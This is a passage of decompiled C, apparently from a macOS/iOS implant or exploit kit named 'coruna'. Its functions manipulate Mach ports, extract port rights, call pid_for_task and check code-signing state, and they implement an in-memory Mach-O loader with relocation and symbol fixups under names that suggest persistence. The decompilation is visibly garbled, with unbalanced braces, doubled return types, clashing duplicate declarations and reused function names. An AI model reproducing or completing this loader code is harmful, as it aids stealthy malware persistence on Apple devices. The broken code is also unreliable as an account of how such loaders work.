  cache = *(long *)k_persist_stack_chk_guard_slot;
  size = 0xad001;
  scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
  if ((((flags == (int *)0x0) ||
       (scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch),
       count_2 == (int *)0x0)) ||
      ((*(long *)(count_2 + 4) == 0 &&
       (scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch),
       count_2[2] != 0)))) ||
     (((*(long *)(count_2 + 8) == 0 &&
       (scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch),
       count_2[6] != 0)) ||
      (scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch),
      if (*(long *)k_persist_stack_chk_guard_slot != cache) {
      ___stack_chk_fail(flags);
      }
      return size;
  bootargs = 0;
  u = _mach_port_allocate(*(ipc_space_t *)k_persist_mach_task_self_slot,1,&bootargs);
  if (u != 0) {
    size = 0x1e01b;
    flags = (int *)(unsigned long)u;
    if (*(long *)k_persist_stack_chk_guard_slot != cache) {
    ___stack_chk_fail(flags);
    }
    return size;
  }
  if (((*(long *)(count_2 + 4) != 0) || (count_2[2] == 0)) &&
     ((*(long *)(count_2 + 8) != 0 ||
      (scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch),
      count_2[6] == 0)))) {
    serial_buf.msgh_bits = 0x1413;
    serial_buf.msgh_remote_port = flags[1];
    serial_buf.msgh_id = *count_2 + *flags;
    scratch = 0;
    scratch = 0;
    action = 0;
    serial_buf.msgh_reserved = 0;
    serial_buf.msgh_size = 0;
    block_ctx = 0;
    bootargs = 0;
    serial_buf.msgh_local_port = bootargs;
    lm8 = count_2[10];
    lpm2 = (mach_port_t *)(unsigned long)lm8;
    if (lm8 + 1 < 2) {
      port = 0x18;
      lpm2 = (mach_port_t *)0x0;
    }
    else {
      action = 1;
      if (*(double *)k_persist_dyldversionnumber_slot <= k_persist_rodata_word_1f010) {
        block_ctx = 0x130000;
      }
      else {
        host_info = 0xffffffff;
        lpm2 = &host_info;
        size = _pid_for_task(lm8,(int *)&host_info);
        if (size != 0) {
          size = size | 0x80000000;
          scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
          u = _mach_port_destroy(*err,bootargs);
          flags = (int *)(unsigned long)u;
          if (*(long *)k_persist_stack_chk_guard_slot != cache) {
          ___stack_chk_fail(flags);
          }
          return size;
        }
        block_ctx = (uint)k_persist_rodata_word_1f018;
        bootargs = (uint32_t)((unsigned long)k_persist_rodata_word_1f018 >> 0x20);
      }
      serial_buf.msgh_bits = 0x80001413;
      port = 0x2c;
    }
    scratch = lpm2;
    if (count_2[2] == 0 && count_2[6] == 0) {
      scratch = (mach_msg_header_t *)0x0;
      msg = &serial_buf;
      version = port;
    }
    else {
      version = (unsigned long)(((uint)port | 3) + count_2[2] + count_2[6] & 0xfffffffc);
      msg = _calloc(1,version);
      if (msg == (mach_msg_header_t *)0x0) {
        size = 0xad009;
        err = (ipc_space_t *)k_persist_mach_task_self_slot;
        u = _mach_port_destroy(*err,bootargs);
        flags = (int *)(unsigned long)u;
        if (*(long *)k_persist_stack_chk_guard_slot != cache) {
        ___stack_chk_fail(flags);
        }
        return size;
      }
      coruna_persist_trampoline_00010010(msg,&serial_buf);
      if (count_2[2] != 0) {
        coruna_persist_trampoline_00010010((long)&msg->msgh_bits + port,*(uint64_t *)(count_2 + 4));
        port = (unsigned long)(count_2[2] + (uint)port);
      }
      scratch = msg;
      if (count_2[6] != 0) {
        coruna_persist_trampoline_00010010((long)&msg->msgh_bits + port,*(uint64_t *)(count_2 + 8));
      }
    }
    msg->msgh_size = (mach_msg_size_t)version;
    lm5 = _mach_msg(msg,0x11,(mach_msg_size_t)version,0,0,arg,0);
    if (lm5 < 0x10000004) {
      if (lm5 == 0) {
        err = true;
        size = 0;
      }
      else {
        if (lm5 != 0x10000003) goto cleanup;
        err = false;
        size = 0x1e02c;
      }
    }
    else if (lm5 == 0x10000004) {
      _mach_msg_destroy(msg);
      err = false;
      size = 0x1e02d;
    }
    else {
cleanup:
      err = false;
      size = 0x1e025;
    }
    _bzero(msg,version);
    if (scratch != (mach_msg_header_t *)0x0) {
      _free(scratch);
    }
    err = (ipc_space_t *)k_persist_mach_task_self_slot;
    if (err) {
      if (bootargs + 1 < 2) {
        size = 0x1e02b;
      }
      else {
        cache_27 = 0;
        cache_26 = 0;
        cache_23 = 0;
        frame = 0;
        cache_25 = 0;
        work = 0;
        cache_24 = 0;
        cache_20 = 0;
        json_buf = 0;
        cache_22 = 0;
        cache_21 = 0;
        frame = 0;
        url_buf = 0;
        cache = 0;
        work = 0;
        plist = 0;
        plist = 0;
        json_buf = 0;
        url_buf = 0;
        path_buf = 0;
        region = 0;
        region = 0;
        tmp_buf = 0;
        sa_new = 0;
        tmp_buf = 0;
        block_ctx = 0;
        path_buf = 0;
        sa_saved = 0;
        stack_guard = 0;
        host_info = 0;
        sa_new = 0;
        action = 0;
        serial_buf = 0;
        bootargs = 0;
        stack_guard = 0;
        scratch = 0;
        block_ctx = 0;
        thread_attr = 0;
        sa_saved = 0;
        serial_buf.msgh_remote_port = 0;
        serial_buf.msgh_local_port = 0;
        serial_buf.msgh_bits = 0;
        serial_buf.msgh_size = 0;
        action = 0;
        scratch = 0;
        serial_buf.msgh_reserved = 0;
        serial_buf.msgh_id = 0;
        lm5 = _mach_msg(&serial_buf,0x102,0,0x13c,bootargs,flags[3],0);
        lm8 = (mach_port_name_t)scratch;
        size = 0x1e021;
        if (lm5 < 0x10004008) {
          if (lm5 != 0) {
            scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
            if (lm5 == 0x10004003) {
              size = 0x1e02e;
              scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
            }
            u = _mach_port_destroy(*err,bootargs);
            flags = (int *)(unsigned long)u;
            if (*(long *)k_persist_stack_chk_guard_slot != cache) {
            ___stack_chk_fail(flags);
            }
            return size;
          }
          if ((serial_buf.msgh_size != 0x134) || (serial_buf.msgh_id != -5)) {
            size = 0x1e029;
            _mach_msg_destroy(&serial_buf);
            scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
            u = _mach_port_destroy(*err,bootargs);
            flags = (int *)(unsigned long)u;
            if (*(long *)k_persist_stack_chk_guard_slot != cache) {
            ___stack_chk_fail(flags);
            }
            return size;
          }
          err = stack_guard;
          if (stack_guard == 0) {
            if ((arg_x == (mach_port_name_t *)0x0) && (handle == 0)) {
              err = 0;
            }
            else {
              if (arg_x == (mach_port_name_t *)0x0) {
                size = 0;
next:
                if (handle != 0) {
                  if ((int)sa_saved == 0) {
                    size = 0xad014;
                    _mach_msg_destroy(&serial_buf);
                    scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
                    u = _mach_port_destroy(*err,bootargs);
                    flags = (int *)(unsigned long)u;
                    if (*(long *)k_persist_stack_chk_guard_slot != cache) {
                    ___stack_chk_fail(flags);
                    }
                    return size;
                  }
                  coruna_persist_trampoline_00010010(handle,(long)&sa_saved + 4);
                  err = stack_guard;
                  size = 0;
                  *fd_3 = err;
                }
              }
              else {
                if (((action != 1) || (block_ctx >> 0x18 != 0)) ||
                   ((mach_port_name_t)scratch + 1 < 2)) {
                  size = 0x1e029;
                  _mach_msg_destroy(&serial_buf);
                  scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
                  u = _mach_port_destroy(*err,bootargs);
                  flags = (int *)(unsigned long)u;
                  if (*(long *)k_persist_stack_chk_guard_slot != cache) {
                  ___stack_chk_fail(flags);
                  }
                  return size;
                }
                host_info = (mach_port_name_t)scratch;
                u = block_ctx >> 0x10 & 0xff;
                if (u - 0x11 < 2) {
                  scratch = 0;
                  size = 0;
                  *arg_x = lm8;
                }
                else if (u == 0x14) {
                  lk6 = _mach_port_insert_right
                                    (*err,(mach_port_name_t)scratch,
                                     (mach_port_name_t)scratch,0x14);
                  if (lk6 == 0) {
                    scratch = 0;
                    size = 0;
                    *arg_x = lm8;
                  }
                  else {
                    size = 0xad00b;
                  }
                }
                else {
                  size = 0x1e029;
                  if (u == 0x15) {
                    thread_attr = 0;
                    lk6 = _mach_port_extract_right
                                      (*err,(mach_port_name_t)scratch,0x15,&host_info,
                                       &thread_attr);
                    lm8 = host_info;
                    if (lk6 != 0) {
                      size = 0xad00b;
                    }
                    else {
                      scratch = 0;
                      size = 0;
                      *arg_x = lm8;
                    }
                  }
                }
                if (size == 0) goto next;
              }
              err = stack_guard;
              if (size != 0) {
                _mach_msg_destroy(&serial_buf);
                scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
                u = _mach_port_destroy(*err,bootargs);
                flags = (int *)(unsigned long)u;
                if (*(long *)k_persist_stack_chk_guard_slot != cache) {
                ___stack_chk_fail(flags);
                }
                return size;
              }
            }
          }
          size = 0;
          *fd_3 = err;
        }
        u = _mach_port_destroy(*err,bootargs);
        flags = (int *)(unsigned long)u;
        if (*(long *)k_persist_stack_chk_guard_slot != cache) {
        ___stack_chk_fail(flags);
        }
        return size;
skip:
        _mach_msg_destroy(&serial_buf);
        scratch = (mach_port_t *)coruna_u64_pack((scratch), ((mach_port_name_t))scratch);
      }
    }
  }
done:
  u = _mach_port_destroy(*err,bootargs);
  flags = (int *)(unsigned long)u;
fail:
  if (*(long *)k_persist_stack_chk_guard_slot != cache) {
    ___stack_chk_fail(flags);
  }
  return size;
}





uint64_t
uint64_t coruna_abort(int64_t arg,uint32_t size,int *flags,uint64_t val,int64_t arg)
{
  int err;
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  uint64_t *thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  int serial_buf;
  uint64_t action;
  uint64_t bootargs;
  uint8_t block_ctx;
  
  u = 0xad001;
  if (((arg != 0) && (flags != (int *)0x0)) && (arg != 0)) {
    err = *flags;
    bootargs = *(uint64_t *)(flags + 4);
    action = *(uint64_t *)(flags + 2);
    block_ctx = (uint8_t)flags[6];
    bootargs = 0x18;
    thread_attr = &action;
    host_info = 0;
    scratch = 0;
    serial_buf = err;
    if (err == 0) {
      serial_buf = *(int *)k_persist_mach_task_self_slot;
    }
    scratch[0] = size;
    u = coruna_port_extract_right(arg,scratch,val,arg,0,flags);
    *flags = err;
  }
  return u;
}





uint64_t
uint64_t coruna_persist_via_port_extract_right_2(int64_t arg,uint32_t size,int *flags,uint64_t val,int64_t arg)
{
  size_t ls1;
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  int *thread_attr;
  uint64_t host_info;
  char *serial_buf;
  int action;
  int block_ctx [2];
  
  u = 0xad001;
  if (((arg != 0) && (flags != (int *)0x0)) &&
     (serial_buf = *(char **)(flags + 2), serial_buf != (char *)0x0 && arg != 0)) {
    block_ctx[0] = flags[5];
    bootargs = 4;
    thread_attr = block_ctx;
    host_info = 0;
    action = *flags;
    if (action == 0) {
      action = *(int *)k_persist_mach_task_self_slot;
    }
    scratch[0] = size;
    ls1 = _strlen(serial_buf);
    host_info = coruna_u64_pack((host_info), (int)ls1 + 1);
    u = coruna_port_extract_right(arg,scratch,val,arg,0,0);
  }
  return u;
}





uint64_t
uint64_t coruna_bind_loader_create(uint64_t *val,short *arg,uint64_t id_2,short *arg,uint64_t size_3 ,int flags)
{
  uint64_t *ptr;
  uint32_t *buf;
  uint64_t u;
  
  u = 0xad001;
  if (((val != (uint64_t *)0x0) &&
      ((arg == (short *)0x0 || ((*arg == 2 && (1 < (ushort)arg[1])))))) &&
     ((arg == (short *)0x0 || ((*arg == 1 && (arg[1] != 0)))))) {
    ptr = _calloc(1,0x20);
    if (ptr == (uint64_t *)0x0) {
      u = 0xad009;
    }
    else {
      ptr[1] = arg;
      ptr[2] = arg;
      u = coruna_load_libcache(ptr,arg,id_2,size_3);
      if ((int)u == 0) {
        if ((flags == 0) || (u = coruna_loader_init_shared_cache(ptr), (int)u == 0)) {
          buf = _calloc(1,0x70);
          if (buf != (uint32_t *)0x0) {
            *buf = 0x10003;
            *(uint64_t **)(buf + 2) = ptr;
            *(void (**)(buf + 4) = coruna_ctx_free;
            *(void (**)(buf + 6) = coruna_loader_bind_image;
            *(void (**)(buf + 8) = coruna_loader_teardown;
            *(void (**)(buf + 10) = coruna_loader_csops_check;
            *(void (**)(buf + 0xc) = coruna_loader_mach_send;
            *(void (**)(buf + 0xe) = coruna_realpath_if_mapped;
            *(void (**)(buf + 0x18) = coruna_call_realpath;
            *(void (**)(buf + 0x10) = coruna_call_pid_for_task;
            *(void (**)(buf + 0x12) = coruna_call_mach_port_deallocate;
            *(void (**)(buf + 0x14) = coruna_loader_verify_sig;
            *(void (**)(buf + 0x16) = coruna_call_mach_port_deallocate;
            *(void (**)(buf + 0x1a) = coruna_loader_iface_get;
            *val = buf;
            return 0;
          }
          u = 0xad009;
          if (ptr[3] != 0) {
            coruna_ctx_free();
            ptr[3] = 0;
          }
        }
        coruna_ctx_free(*ptr);
        *ptr = 0;
      }
      _free(ptr);
    }
  }
  return u;
}





uint64_t coruna_loader_init_shared_cache(uint64_t *val)
{
  int err;
  uint64_t u;
  long *ptr;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    ptr = val + 3;
    if ((*ptr == 0) && (val[2] != 0)) {
      u = coruna_csops(ptr,val[2],*val,val[1]);
      err = (int)u;
      if ((err != 0) && ((err == 0x7003 || ((val[1] == 0 && (err == 0x1e037)))))) {
        u = 0;
        *ptr = 0;
      }
    }
    else {
      u = 0;
    }
  }
  return u;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  uint64_t size;
  uint64_t *ptr;
  
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  ptr = (uint64_t *)val[1];
  if (ptr[3] == 0) {
    size = coruna_ctx_free(*ptr);
  }
  else {
    u = coruna_ctx_free();
    size = coruna_ctx_free(*ptr);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    _free(ptr);
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return u;
  }
  u = size;
fail:
  ptr[1] = 0;
  *ptr = 0;
  ptr[3] = 0;
  ptr[2] = 0;
  _free(ptr);
  val[0xb] = 0;
  val[10] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return u;
}





unsigned long coruna_loader_bind_image(long arg,short *val)

{
  uint u;
  unsigned long size;
  uint64_t *ptr;
  
  size = 0xad001;
  if ((((arg != 0) && (val != (short *)0x0)) && (*val == 2)) && (1 < (ushort)val[1])
     ) {
    ptr = *(uint64_t **)(arg + 8);
    if ((short *)ptr[1] == (short *)0x0) {
      size = coruna_loader_set_image(*ptr,val);
      if ((int)size == 0) {
        ptr[1] = val;
        size = coruna_loader_init_shared_cache(ptr);
        if ((int)size != 0) {
          ptr[1] = 0;
        }
      }
    }
    else {
      u = 0;
      if ((short *)ptr[1] != val) {
        u = 0xad005;
      }
      size = (unsigned long)u;
    }
  }
  return size;
}





uint64_t coruna_loader_teardown(long handle)
{
  uint64_t u;
  long handle;
  uint64_t size;
  uint64_t *ptr;
  long *ptr;
  
  size = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  ptr = *(uint64_t **)(handle + 8);
  if (ptr[1] == 0) {
    return 0;
  }
  if (ptr[3] == 0) {
    ptr = (long *)*ptr;
    if (ptr != (long *)0x0) {
      handle = *ptr;
      if ((handle != 0) && ((char)ptr[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,ptr[1]);
      }
      size = 0;
      *ptr = 0;
      ptr[1] = 0;
      *(uint8_t *)(ptr + 2) = 0;
    }
  }
  else {
    u = coruna_ctx_free();
    ptr[3] = 0;
    ptr = (long *)*ptr;
    if (ptr != (long *)0x0) {
      handle = *ptr;
      if ((handle != 0) && ((char)ptr[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,ptr[1]);
      }
      size = 0;
      *ptr = 0;
      ptr[1] = 0;
      *(uint8_t *)(ptr + 2) = 0;
    }
    ptr[1] = 0;
    return u;
  }
  u = size;
fail:
  ptr[1] = 0;
  return u;
}





uint64_t coruna_loader_csops_check(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_csops(**(uint64_t **)(handle + 8));
    return u;
  }
  return 0xad001;
}





uint64_t
uint64_t coruna_loader_mach_send(int64_t arg,int64_t arg,uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  uint64_t u;
  uint64_t size;
  uint16_t *ptr;
  uint64_t version;
  uint64_t *buf;
  long scratch;
  
  version = 0xad001;
  if ((((arg != 0) && (arg != 0)) && ((int)val != 0)) && (size_3 != (uint64_t *)0x0))
  {
    buf = *(uint64_t **)(arg + 8);
    ptr = _calloc(1,0x40);
    if (ptr == (uint16_t *)0x0) {
      version = 0xad009;
    }
    else {
      *ptr = 1;
      ((void (**)(void *, long, uint64_t))(ptr + 0x14))[0] = coruna_ctx_free;
      ((void (**)(void *, long, uint64_t))(ptr + 0x18))[0] = coruna_lookup_export_call;
      ((void (**)(void *, long, uint64_t))(ptr + 0x1c))[0] = coruna_loader_set_image_call;
      scratch = 0;
      version = coruna_lookup_export(*buf,arg,val,id_2,&scratch);
      if ((int)version == 0) {
        u = *(uint64_t *)(scratch + 8);
        size = *(uint64_t *)(scratch + 0x10);
        *(long *)(ptr + 4) = scratch;
        *(uint64_t *)(ptr + 8) = u;
        *(int *)(ptr + 0xc) = (int)size;
        *(uint64_t *)(ptr + 0x10) = *(uint64_t *)(scratch + 0x18);
        *size_3 = ptr;
      }
      else {
        coruna_ctx_free(ptr);
      }
    }
  }
  return version;
}





unsigned long coruna_realpath_if_mapped(long arg,uint64_t val)

{
  uint u;
  unsigned long size;
  
  u = 0xad001;
  if (arg != 0) {
    if (*(long *)(*(long *)(arg + 8) + 0x18) != 0) {
      size = coruna_realpath(val,3);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





unsigned long coruna_call_realpath(long arg,uint64_t val,uint64_t n,uint64_t m)

{
  uint u;
  unsigned long size;
  
  u = 0xad001;
  if (arg != 0) {
    if (*(long *)(*(long *)(arg + 8) + 0x18) != 0) {
      size = coruna_realpath(val,n,m);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





unsigned long coruna_call_pid_for_task(long arg)

{
  uint u;
  unsigned long size;
  long serial;
  
  u = 0xad001;
  if (arg != 0) {
    serial = *(long *)(*(long *)(arg + 8) + 0x18);
    if (serial != 0) {
      size = coruna_pid_for_task(serial);
      return size;
    }
    u = 0xad010;
  }
  return (unsigned long)u;
}





uint64_t coruna_call_mach_port_deallocate(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if (handle != 0) {
    handle = *(long *)(*(long *)(handle + 8) + 0x18);
    if (handle == 0) {
      u = 0xad010;
    }
    else {
      u = coruna_mach_port_deallocate_218cc(handle);
    }
  }
  return u;
}





uint64_t coruna_loader_verify_sig(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if (handle != 0) {
    handle = *(long *)(*(long *)(handle + 8) + 0x18);
    if (handle == 0) {
      u = 0xad010;
    }
    else {
      u = coruna_mach_port_deallocate_2145c(handle);
    }
  }
  return u;
}





uint64_t coruna_call_mach_port_deallocate(long handle,uint64_t val,uint64_t id_2,long addr_2)
{
  uint64_t u;
  
  if ((((handle != 0) && ((int)val != 0)) && ((int)val != -1)) && (addr_2 != 0)) {
    u = coruna_mach_port_deallocate(val,id_2,0,addr_2,0);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_loader_iface_get(long handle)
{
  uint64_t u;
  long handle;
  
  u = 0;
  if (handle != 0) {
    if ((*(long **)(handle + 8) == (long *)0x0) || (handle = **(long **)(handle + 8), handle == 0))
    {
      return 0;
    }
    u = *(uint64_t *)(handle + 8);
  }
  return u;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    if (val[1] == 0) {
      u = 0;
    }
    else {
      u = coruna_loader_ctx_destroy();
    }
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
  }
  return u;
}





uint64_t coruna_lookup_export_call(long handle,long addr_2,long off_3)
{
  uint64_t u;
  
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != 0)) && (*(long *)(handle + 8) != 0)) {
    u = coruna_lookup_export();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_loader_set_image_call(long handle)
{
  uint64_t u;
  
  if ((handle != 0) && (*(long *)(handle + 8) != 0)) {
    u = coruna_persist_via_macho_foreach_loadcmd();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_macho_apply_fixups(long handle)
{
  uint *ptr;
  long *ptr;
  unsigned long *buf;
  unsigned long *str;
  unsigned long *copy;
  unsigned long *data;
  uint u;
  byte err;
  long handle;
  uint *obj;
  unsigned long *block;
  uint *entry;
  unsigned long size;
  int *err;
  int err;
  uint *entry_9;
  unsigned long version;
  uint port;
  unsigned long tag;
  int *status;
  uint kind;
  uint64_t type_id;
  long addr;
  long off;
  unsigned long type_id_8;
  long base;
  uint *entry_10;
  int *flags;
  long ctx_val;
  long serial;
  long scratch;
  
  if (handle == 0) {
    type_id = 0xad001;
  }
  else {
    ctx_val = *(long *)(handle + 0x120);
    if ((((ctx_val == 0) || (base = *(long *)(handle + 0x1b0), base == 0)) ||
        (entry_10 = *(uint **)(handle + 8), entry_10 == (uint *)0x0)) ||
       ((serial = *(long *)(handle + 0x10), serial == 0 ||
        (addr = *(long *)(handle + 0x170), addr == 0)))) {
      type_id = 0x930009;
    }
    else {
      type_id = 0x930009;
      if (*(long *)(handle + 0x1a8) != 0) {
        off = *(long *)(handle + 0x50);
        port = *(uint *)(base + 0x4c);
        handle = coruna_fixup_slide_base(handle);
        type_id = 0x930008;
        if (handle != 0) {
          if (port != 0) {
            obj = (uint *)(ctx_val + (unsigned long)*(uint *)(base + 0x48));
            if (obj < entry_10) {
              return 0x930003;
            }
            ptr = (uint *)(serial + (long)entry_10);
            if (ptr <= obj) {
              return 0x930003;
            }
            entry = obj + (unsigned long)port * 2;
            entry_9 = (uint *)((long)entry - 1);
            if (entry_9 < entry_10) {
              return 0x930003;
            }
            if (ptr <= entry_9) {
              return 0x930003;
            }
            do {
              port = *obj;
              tag = (unsigned long)port;
              if ((int)port < 0) {
                if ((~port & 0x30000000) != 0) {
                  return 0x930002;
                }
                if ((port & 0xf000000) != 0) {
                  return 0x930002;
                }
                tag = tag & 0xffffff;
fail:
                ptr = (long *)(handle + tag);
                if (ptr < *(long **)(handle + 8) ||
                    (long *)(*(long *)(handle + 0x10) + (long)*(long **)(handle + 8)) <= ptr) {
                  return 0x930001;
                }
                *ptr = *ptr + off;
              }
              else if ((obj[1] & 0xffffff) != 0) {
                if ((obj[1] & 0xf6000000) != 0x6000000) {
                  return 0x930002;
                }
                ptr = (long *)(handle + tag);
                if (ptr < *(long **)(handle + 8) ||
                    (long *)(*(long *)(handle + 0x10) + (long)*(long **)(handle + 8)) <= ptr) {
                  return 0x930001;
                }
                *ptr = *ptr + off;
              }
              obj = obj + 2;
            } while (obj < entry);
            ctx_val = *(long *)(handle + 0x120);
            if (ctx_val == 0) {
              return 0x910012;
            }
            entry_10 = *(uint **)(handle + 8);
            if (entry_10 == (uint *)0x0) {
              return 0x910012;
            }
          }
          if (*(long *)(handle + 0x10) == 0) {
            type_id = 0x910012;
          }
          else {
            port = *(uint *)(base + 0x44);
            if (port != 0) {
              obj = (uint *)(ctx_val + (unsigned long)*(uint *)(base + 0x40));
              if (obj < entry_10) {
                return 0x91000a;
              }
              ptr = (uint *)(*(long *)(handle + 0x10) + (long)entry_10);
              if (ptr <= obj) {
                return 0x91000a;
              }
              entry = (uint *)((long)obj + (unsigned long)port * 8 + -1);
              if (entry < entry_10) {
                return 0x91000a;
              }
              if (ptr <= entry) {
                return 0x91000a;
              }
              u = *(uint *)(addr + 0x18);
              ctx_val = coruna_fixup_slide_base(handle);
              if (ctx_val == 0) {
                return 0x930008;
              }
              tag = 0;
              scratch = 0;
              block = (unsigned long *)0x0;
              do {
                if ((obj[tag * 2 + 1] & 0xf6000000) != 0x6000000) {
                  return 0x910002;
                }
                buf = (unsigned long *)(ctx_val + (int)obj[tag * 2]);
                data = *(unsigned long **)(handle + 8);
                str = (unsigned long *)(*(long *)(handle + 0x10) + (long)data);
                if (buf < data || str <= buf) {
                  return 0x910002;
                }
                base = *(long *)(handle + 0x1a8);
                version = (unsigned long)obj[tag * 2 + 1] & 0xffffff;
                copy = (unsigned long *)(base + version * 0x10);
                if (copy < data || str <= copy) {
                  return 0x910002;
                }
                size = *buf;
                type_id_8 = size;
                if ((u >> 4 & 1) != 0) {
                  serial = base + version * 0x10;
                  if (((~*(byte *)(serial + 4) & 0xe) == 0) &&
                     ((*(ushort *)(serial + 6) >> 7 & 1) != 0)) {
                    base = base + version * 0x10;
                    version = size - *(long *)(base + 8);
                    type_id_8 = version;
                    if (version != 0) {
                      err = *(int *)(*(long *)(handle + 0x170) + 0x10);
                      if (err == 0) {
done:
                        type_id_8 = 0;
                      }
                      else {
                        err = *(byte *)(base + 5);
                        status = (int *)(*(long *)(handle + 0x148) + 0x20);
                        kind = 1;
                        do {
                          if (*status == 0x19) {
                            if (((kind & 0xff) <= (uint)err) &&
                               ((uint)err < status[0x10] + (kind & 0xff))) {
                              err = (uint)err - (kind & 0xff);
                              if ((size < *(unsigned long *)(status + (long)err * 0x14 + 0x1a)) ||
                                 (type_id_8 = version,
                                 *(long *)(status + (long)err * 0x14 + 0x1c) +
                                 *(unsigned long *)(status + (long)err * 0x14 + 0x1a) <= size))
                              goto done;
                              break;
                            }
                            kind = kind + status[0x10];
                          }
                          status = (int *)((long)status + (unsigned long)(uint)status[1]);
                          err = err + -1;
                          type_id_8 = 0;
                        } while (err != 0);
                      }
                    }
                  }
                  else {
                    type_id_8 = size - *(long *)(serial + 8);
                  }
                }
                if ((copy != block) &&
                   (type_id = coruna_fixup_resolve_sym(handle,copy,&scratch,0), (int)type_id != 0)) {
                  return type_id;
                }
                if (((u >> 4 & 1) == 0) || (*buf != scratch + type_id_8)) {
                  *buf = scratch + type_id_8;
                }
                tag = tag + 1;
                block = copy;
              } while (tag != port);
            }
            if ((((*(long *)(handle + 0x148) == 0) || (*(long *)(handle + 0x120) == 0)) ||
                (*(long *)(handle + 0x1b0) == 0)) ||
               ((*(long *)(handle + 8) == 0 || (*(long *)(handle + 0x10) == 0)))) {
              type_id = 0x910011;
            }
            else {
              type_id = 0x910011;
              if (*(long *)(handle + 0x1a8) != 0) {
                ctx_val = *(long *)(handle + 0x170);
                if (*(int *)(ctx_val + 0x10) == 0) {
                  type_id = 0;
                }
                else {
                  port = 0;
                  base = *(long *)(handle + 0x120) +
                           (unsigned long)*(uint *)(*(long *)(handle + 0x1b0) + 0x38);
                  serial = *(long *)(handle + 8) - *(long *)(handle + 0x168);
                  status = (int *)(*(long *)(handle + 0x148) + 0x20);
                  do {
                    if (*status == 0x19) {
                      flags = status + 0x12;
                      err = flags + (unsigned long)(uint)status[0x10] * 0x14;
                      if (flags < err) {
cleanup:
                        if ((flags[0x10] & 0xfeU) != 6 || *(unsigned long *)(flags + 10) < 8) {
                          type_id = 0;
check_ok:
                          flags = flags + 0x14;
                          if ((err <= flags) || ((int)type_id != 0)) goto skip;
                          goto cleanup;
                        }
                        u = flags[0x11];
                        tag = base + (unsigned long)u * 4;
                        type_id_8 = *(unsigned long *)(handle + 8);
                        version = *(long *)(handle + 0x10) + type_id_8;
                        if ((type_id_8 <= tag && tag < version) &&
                           (size = *(unsigned long *)(flags + 10) >> 3,
                           tag = (base + (size + u) * 4) - 4,
                           type_id_8 <= tag && tag < version)) {
                          tag = 0;
                          ctx_val = *(long *)(flags + 8) + serial;
                          do {
                            kind = *(uint *)(base + (unsigned long)(u + (int)tag) * 4);
                            if (kind == 0x40000000) {
                              type_id = 0;
                            }
                            else if (kind == 0x80000000) {
                              type_id = 0;
                              *(long *)(ctx_val + tag * 8) =
                                   *(long *)(ctx_val + tag * 8) + serial;
                            }
                            else {
                              version = *(long *)(handle + 0x1a8) + (unsigned long)kind * 0x10;
                              if (version < *(unsigned long *)(handle + 8) ||
                                  *(long *)(handle + 0x10) + *(unsigned long *)(handle + 8) <= version) {
                                type_id = 0x910004;
                                goto skip;
                              }
                              scratch = 0;
                              type_id = coruna_fixup_resolve_sym(handle,version,&scratch,1);
                              if ((int)type_id == 0) {
                                *(long *)(ctx_val + tag * 8) = scratch;
                              }
                            }
                            tag = tag + 1;
                          } while (((tag & 0xffffffff) < size) && ((int)type_id == 0));
                          goto check_ok;
                        }
                        type_id = 0x910005;
skip:
                        ctx_val = *(long *)(handle + 0x170);
                      }
                      else {
                        type_id = 0;
                      }
                    }
                    else {
                      type_id = 0;
                    }
                    status = (int *)((long)status + (unsigned long)(uint)status[1]);
                    port = port + 1;
                  } while (port < *(uint *)(ctx_val + 0x10) && (int)type_id == 0);
                }
              }
            }
